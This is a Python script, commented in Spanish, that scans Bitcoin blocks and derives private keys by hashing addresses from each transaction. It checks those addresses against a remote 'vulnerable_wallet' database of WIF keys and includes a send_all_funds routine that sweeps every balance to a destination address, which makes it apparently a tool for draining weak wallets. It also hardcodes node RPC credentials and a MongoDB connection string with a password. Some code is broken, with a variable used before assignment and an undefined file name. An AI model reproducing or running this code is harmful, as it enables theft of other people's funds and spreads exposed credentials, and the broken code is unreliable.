import os
import hashlib
import requests
import json
import sqlite3
from requests.auth import HTTPBasicAuth

import time
from bitcoinx import (
    private_key_to_public_key,
    pubkey_to_bitcoin_address,
    btcPrivatekeyHextoWIF,
)

from getz_input import (
    parseTx,
    getSignableTxn
)

from bit import Key
from bit.network import NetworkAPI

# RPC BTC
btcHost = '127.0.0.1'
auth = HTTPBasicAuth('anigametv', 'gotech2020')

from pymongo import MongoClient

# Configurar la conexión a MongoDB
client = MongoClient("mongodb://animeflv:Onyx01091995@onyx.i234.me:27017/")
db = client["admin"]  # Nombre de la base de datos
collection = db["vulnerable_wallet"]  # Nombre de la colección

# Crear un índice en el campo address para mejorar la eficiencia de las búsquedas
collection.create_index("address")

def buscar_wifMongoDB(address):
    """
    Busca el WIF correspondiente a una dirección en MongoDB.
    
    :param address: La dirección a buscar.
    :return: El WIF correspondiente a la dirección, o None si no se encuentra.
    """
    try:
        # Realizar la consulta buscando el address
        resultado = collection.find_one({"address": address}, {"_id": 0, "wif": 1})
        
        if resultado:
            return resultado["wif"]
        else:
            print(f"Dirección {address} no encontrada.")
            return None

    except Exception as e:
        print(f"Error al buscar la dirección: {e}")
        return None



# Función para obtener todas las addresses
def obtener_todas_las_addresses():
    # Conectar a la base de datos local
    conn = sqlite3.connect('datos.db')
    cursor = conn.cursor()
    
    # Obtener todas las addresses de la tabla
    cursor.execute('''
    SELECT address FROM datos
    ''')
    resultados = cursor.fetchall()
    
    # Cerrar la conexión
    conn.close()
    
    # Convertir el resultado en un array de addresses
    addresses = [resultado[0] for resultado in resultados]
    return addresses


# Función para buscar el wif por address
def buscar_wif_por_address(address):
    # Conectar a la base de datos local
    conn = sqlite3.connect('vulnerableWalletBTC.db')
    cursor = conn.cursor()
    
    # Buscar el wif correspondiente al address
    cursor.execute('''
    SELECT wif FROM datos WHERE address = ?
    ''', (address,))
    resultado = cursor.fetchone()
    
    # Cerrar la conexión
    conn.close()
    
    # Retornar el wif si se encuentra, de lo contrario, retornar None
    return resultado[0] if resultado else None



def guardar_texto_en_archivo(texto, nombre_archivo):
    with open(nombre_archivo, 'a') as archivo:
        archivo.write(texto + '\n')


# Obtener Numero del Bloque
def get_latest_block_number():
    data = {
        "method": "getblockcount",
        "params": [],
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()  # Raises an error for 4xx/5xx status codes
        result = response.json().get('result')
        return result
    except requests.exceptions.RequestException as e:
        return False


# Obtener Informacion del Bloque por el hash pasando el numero
def obtener_info_bloque(block_number):
    
    # Obtener el hash del bloque usando el número del bloque
    data = {
        "method": "getblockhash",
        "params": [block_number],
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        block_hash = response.json().get('result')
        
        # Obtener la información del bloque usando el hash del bloque
        data = {
            "method": "getblock",
            "params": [block_hash],
            "id": 1
        }
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        block_info = response.json().get('result')

        # Extraer hash del bloque y array de transacciones
        block_hash = block_info.get('hash')
        tx_array = block_info.get('tx')
        getmerkleroot = block_info.get('merkleroot')
        
        return block_hash, tx_array, getmerkleroot

    except requests.exceptions.RequestException as e:
        return None, [], None


# Obtener todas las direcciones del tx
def get_transaction_addresses(txid=None):

    if not txid:
        return []


    data = {
        "method": "getrawtransaction",
        "params": [txid, True],
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        transaction_info = response.json().get('result')

        getRAWTX = transaction_info['hex']

        if not getRAWTX:
            return []
        
        m = parseTx(getRAWTX)

        if isinstance(m, dict) and "error" in m:
            return []

        e = getSignableTxn(m)

        # Extraer direcciones de salida 
        addresses = set()

        for i in range(len(e)):
            pubKey = e[i][3]
            # Convertir PubKey a Address
            getAddress = pubkey_to_bitcoin_address(pubKey)
            addresses.add(getAddress)


        return addresses

    except requests.exceptions.RequestException as e:
        print(f"Ocurrio Error al obtener address: {e}")
        return []


# Función para enviar todos los fondos
def send_all_funds(privateKeyWIF, destination_address):
    # Crear una clave a partir de la clave privada en formato WIF
    key = Key(privateKeyWIF)

    while True:

        # Verificar el saldo disponible
        balance = key.get_balance('btc')
        print(f"Saldo disponible: {balance} BTC")
        
        try:
            # Asegurarse de que balance es un número flotante
            balance = float(balance)
        except ValueError:
            print("Error: El saldo no es un número válido.")
            return


        if balance <= 0:
            print("No hay fondos disponibles para enviar")
            break  # Sale del bucle while si se cumple la condición


        try:
            # Crear la transacción con la tarifa configurada
            tx = key.create_transaction([], leftover=destination_address, replace_by_fee=False, absolute_fee=True)

            # Verificar que la transacción fue exitosa
            if tx:
                print(f"Transacción creada con éxito: {tx}")
            else:
                print("No se pudo crear la transacción, sin detalles de la respuesta.")

        except Exception as e:
            print(f"Error al crear la transacción: {str(e)}")


        # Esperar 10 segundos antes de intentar nuevamente hasta que quede en 0 BTC
        time.sleep(10)



# Función para obtener el balance de una dirección usando la API de Blockchain.info
def obtener_balance_direccion(direcciones):
    """
    Obtiene el balance de varias direcciones usando la API de Blockchain.info.
    Las direcciones se pasan en lotes de 140 debido a las limitaciones de la API.

    :param direcciones: Lista de direcciones Bitcoin.
    :return: Diccionario con los balances de las direcciones.
    """
    # Asegúrate de que 'direcciones' es una lista
    if isinstance(direcciones, str):
        direcciones = direcciones.split(',')  # Convertir cadena separada por comas en lista


    # Agrupar direcciones en bloques de 140 para evitar superar los límites de la API
    balances = {}
    for i in range(0, len(direcciones), 140):
        batch = direcciones[i:i+140]

        # Unir las direcciones con '|' para la URL
        direcciones_unidas = '|'.join(batch)
        
        url = f"https://blockchain.info/balance?active={direcciones_unidas}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()

            balances.update(data)
        else:
            print(f"Error al obtener el balance para las direcciones: {direcciones_unidas}")
            print(f"Respuesta de la API: {response.text}")
        

        # Esperar 5 segundos antes de procesar el siguiente lote
        time.sleep(5)
    
    return balances



# Función para generar direcciones y WIF
def generar_direcciones_y_wif(texto=None, isAddress=False):
    """
    Genera las direcciones Bitcoin (comprimida y sin comprimir) y sus WIFs a partir de un texto.

    :param texto: Cadena de texto base para generar el hash SHA-256.
    :param isAddress: Si es True, se genera una dirección; si es False, se genera una clave privada.
    :return: Diccionario con las direcciones y WIFs.
    """

    if texto is None:
        return False  # Si texto es None, devolvemos False

    if isAddress:
        # Generar el hash SHA-256 del texto
        hex_generate = hashlib.sha256(texto.encode()).hexdigest()
    else:
        # Usar el texto tal cual si isAddress es False
        hex_generate = texto


    # Convertir Hex a WIF (comprimida y sin comprimir)
    pk_wif_sin_comprimir, pk_wif_comprimida = btcPrivatekeyHextoWIF(hex_generate)
    
    # PrivateKey HEX to Pubkey (comprimida y sin comprimir)
    pubkey_sin_comprimir, pubkey_comprimida = private_key_to_public_key(hex_generate)
    
    # PubKey to Address (comprimida y sin comprimir)
    address_sin_comprimir = pubkey_to_bitcoin_address(pubkey_sin_comprimir)
    address_comprimida = pubkey_to_bitcoin_address(pubkey_comprimida)
    
    # Devolver los resultados en un diccionario
    return {
        "hash_hex": hex_generate,
        "wif_sin_comprimir": pk_wif_sin_comprimir,
        "wif_comprimida": pk_wif_comprimida,
        "direccion_sin_comprimir": address_sin_comprimir,
        "direccion_comprimida": address_comprimida,
    }


# Función para procesar un bloque y sus transacciones
def procesar_bloque_y_transacciones(bloque_id):

    # Obtener información del bloque
    block_hash, tx_hashes, getmerkleroot = obtener_info_bloque(bloque_id)
    if block_hash is None:
        return


    # Obtenemos las direcciones de las transacciones y les asignamos los WIFs, buscamos la direcciones de cada tx y asi buscamos en mongodb si existe la direccion entonces retiramos
    for i, tx_hash in enumerate(tx_hashes):
        # Mostrar el número de transacciones restantes por procesar
        print(f"Procesando transacción {tx_hash}... ({i+1} de {len(tx_hashes)}) restantes.")

        tx_direcciones = get_transaction_addresses(tx_hash)
        for addr in tx_direcciones:
            # Convertir la dirección y asignar solo el WIF correspondiente
            resultado = generar_direcciones_y_wif(addr, isAddress=True)

            if resultado:  # Verificamos que resultado no sea False
                # Verificar que las direcciones comiencen con '1' antes de agregarlas
                if resultado['direccion_sin_comprimir'].startswith('1'):
                    direccionSinComprimir = resultado['direccion_sin_comprimir']
                    wifSinComprimir = resultado['wif_sin_comprimir']

                    # Buscar en MongoDB, si existe retiramos saldo
                    searchMongoDBWIF = buscar_wifMongoDB(direccionSinComprimir)
                    if searchMongoDBWIF:
                        print(f"[Nueva Transaccion] {direccionComprimir} :: {searchMongoDBWIF}")


                if resultado['direccion_comprimida'].startswith('1'):
                    direccionComprimir = resultado['direccion_comprimida']
                    wifComprimir = resultado['wif_comprimida']

                    # Buscar en MongoDB, si existe retiramos saldo
                    searchMongoDBWIF = buscar_wifMongoDB(direccionComprimir)
                    if searchMongoDBWIF:
                        print(f"[Nueva Transaccion] {direccionComprimir} :: {searchMongoDBWIF}")




# Obtener el número del último bloque
latest_block_number = None

def contador_infinito(inicio):
    
    i = inicio
    while True:
        yield i
        i += 1
        # Guarda el número actual en el archivo
        with open(archivo, 'w') as f:
            f.write(str(i))


# comenzaremos desde el bloque actual para asi obtener todas las direcciones
getLastBloque = get_latest_block_number()

# 08 ene 2009
for i in contador_infinito(getLastBloque):

    new_block_number = i
    print(f"[BlockId: {new_block_number}]")
    if new_block_number != latest_block_number:
        latest_block_number = new_block_number
        procesar_bloque_y_transacciones(latest_block_number)
